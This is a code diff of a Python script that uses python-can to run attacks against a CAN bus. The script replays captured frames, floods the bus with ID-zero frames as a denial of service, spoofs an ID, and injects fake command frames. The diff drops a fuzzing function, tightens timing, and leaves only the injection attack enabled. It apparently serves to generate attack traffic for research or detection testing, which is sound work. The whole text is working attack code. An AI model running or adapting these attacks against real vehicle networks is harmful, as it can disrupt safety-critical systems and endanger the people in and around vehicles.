@@ -7,35 +7,17 @@ def replay_attack(bus, recorded_messages, duration):
     while time.time() - start < duration:
         for msg in recorded_messages:
             bus.send(msg)
-            # time.sleep(0.02)
-            # Send attack a random time between 0.01 and 0.05 seconds
-            time.sleep(random.uniform(0.01, 0.05))
+            time.sleep(0.01)
 
 def dos_attack(bus, duration):
-    msg = can.Message(arbitration_id=0x000, data=[0xEE]*1, is_extended_id=False)
+    msg = can.Message(arbitration_id=0x000, data=[0x00], is_extended_id=False)
     start = time.time()
     while time.time() - start < duration:
         try:
             bus.send(msg)
-            time.sleep(0.01)
-            # time.sleep(random.uniform(0.01, 0.05))
             print("Sending dos message")
         except Exception as e:
             print(e)
-            pass
-
-def fuzzy_attack(bus, duration):
-    start = time.time()
-    while time.time() - start < duration:
-        msg = can.Message(
-            arbitration_id=random.randint(0x000, 0x7FF),
-            data=[random.randint(0x00, 0xFF) for _ in range(1)],
-            is_extended_id=False
-        )
-        try:
-            bus.send(msg)
-            time.sleep(0.005)
-        except:
             pass
 
 def spoofing_attack(bus, duration):
@@ -45,21 +27,19 @@ def spoofing_attack(bus, duration):
     while time.time() - start < duration:
         msg = can.Message(arbitration_id=spoofed_id, data=[random.randint(0x00, 0x01) for _ in range(1)], is_extended_id=False)
         bus.send(msg)
-        # time.sleep(0.02)
-        time.sleep(random.uniform(0.01, 0.05))
+        time.sleep(0.01)
 
 def injection_attack(bus, duration):
     fake_commands = [
-        can.Message(arbitration_id=0x321, data=[0x00], is_extended_id=False),
-        can.Message(arbitration_id=0x400, data=[0x10], is_extended_id=False)
+        can.Message(arbitration_id=440, data=[0x20], is_extended_id=False),
+        can.Message(arbitration_id=1121, data=[0x03], is_extended_id=False)
     ]
 
     start = time.time()
     while time.time() - start < duration:
         for msg in fake_commands:
             bus.send(msg)
-            # time.sleep(0.02)
-            time.sleep(random.uniform(0.01, 0.05))
+            time.sleep(0.01)
 
 def capture_messages(bus, duration=2):
     captured = []
@@ -78,14 +58,13 @@ def main():
     recorded_messages = capture_messages(bus, duration=2)
 
     attacks = [
-        ("Replay Attack", replay_attack, recorded_messages),
-        ("DoS Attack", dos_attack, None),
-        #("Fuzzy Attack", fuzzy_attack, None),
-        ("Spoofing Attack", spoofing_attack, None),
+        #("Replay Attack", replay_attack, recorded_messages),
+        # ("DoS Attack", dos_attack, None),
+        #("Spoofing Attack", spoofing_attack, None),
         ("Injection Attack", injection_attack, None),
     ]
 
-    duration_per_attack = 30
+    duration_per_attack = 5
 
     for name, attack_fn, arg in attacks:
         print(f"\n=== STARTING: {name} ===")
@@ -96,7 +75,7 @@ def main():
         print(f"=== FINISHED: {name} ===\n")
         time.sleep(3)
 
-    print("[DONE] All attacks have been executed.")
+    print(" All attacks have been executed.")
 
 if __name__ == "__main__":
     main()
